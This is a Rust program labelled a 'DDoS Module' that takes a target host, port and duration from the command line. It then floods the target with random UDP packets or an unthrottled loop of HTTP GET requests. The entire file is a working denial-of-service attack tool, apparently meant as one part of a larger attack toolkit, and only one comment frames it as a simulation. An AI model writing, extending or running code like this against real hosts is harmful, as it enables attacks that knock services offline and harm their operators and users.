use std::env;
use std::time::{Duration, Instant};
use std::thread;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use tokio::runtime::Runtime;

fn main() {
    println!("[DDoS Module] Started.");
    
    // Args: executable [method] [target] [port] [duration]
    let args: Vec<String> = env::args().collect();
    
    if args.len() < 5 {
        println!("Usage: ddos [method] [target] [port] [duration]");
        return;
    }
    
    let method = &args[1];
    let target = &args[2];
    let port = args[3].parse::<u16>().unwrap_or(80);
    let duration = args[4].parse::<u64>().unwrap_or(60);
    
    println!("Attack: {} -> {}:{} for {}s", method, target, port, duration);
    
    let running = Arc::new(AtomicBool::new(true));
    let r = running.clone();
    
    // Timer Thread
    thread::spawn(move || {
        thread::sleep(Duration::from_secs(duration));
        r.store(false, Ordering::Relaxed);
        println!("[DDoS Module] Time's up. Stopping.");
    });
    
    let rt = Runtime::new().unwrap();
    rt.block_on(async {
        match method.as_str() {
            "UDP_RANDOM" => attack_udp(target, port, running).await,
            "HTTP_FLOOD" => attack_http(target, port, running).await,
            _ => println!("Unknown method: {}", method),
        }
    });
}

async fn attack_udp(target: &str, port: u16, running: Arc<AtomicBool>) {
    use tokio::net::UdpSocket;
    use rand::Rng;
    let socket = UdpSocket::bind("0.0.0.0:0").await.unwrap();
    let addr = format!("{}:{}", target, port);
    
    while running.load(Ordering::Relaxed) {
        let mut payload = [0u8; 1024];
        rand::thread_rng().fill(&mut payload); // Randomize junk
        let _ = socket.send_to(&payload, &addr).await;
        // Limit speed for simulation to avoid crashing self
        // tokio::time::sleep(Duration::from_micros(1)).await;
    }
}

async fn attack_http(target: &str, port: u16, running: Arc<AtomicBool>) {
    use reqwest::Client;
    let client = Client::new();
    let url = format!("http://{}:{}/", target, port);
    
    while running.load(Ordering::Relaxed) {
        let _ = client.get(&url).send().await;
    }
}
